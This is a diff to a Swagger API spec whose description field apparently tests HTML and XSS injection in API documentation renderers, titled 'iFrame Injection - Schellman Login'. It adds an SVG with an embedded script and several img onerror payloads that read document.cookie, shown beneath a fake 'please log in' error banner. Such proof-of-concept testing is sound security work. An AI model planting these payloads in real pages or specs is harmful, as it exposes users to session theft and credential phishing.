@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: HTML Injection - Schellman Login 
+  title: iFrame Injection - Schellman Login 
   description: '<div class="login-form">
 <!-- Error Message -->
 <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
@@ -9,6 +9,18 @@ info:
     <strong>An error occurred while loading, please log in.</strong>
   </div>
 </div>
+
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
+  <rect width="124" height="124" rx="24" fill="#000000"/>
+  <script type="text/javascript">  
+    alert(document.cookie);
+  </script>
+</svg>
+
+"><img src=x onError=prompt(document.cookie)>
+'"><img src=x onerroR=alert(document.domain)>
+"><img src=x onError=prompt(1)>
+'"><img src=x onerroR=alert(2)>
 
 <!-- Login Form -->
 <div class="heading">
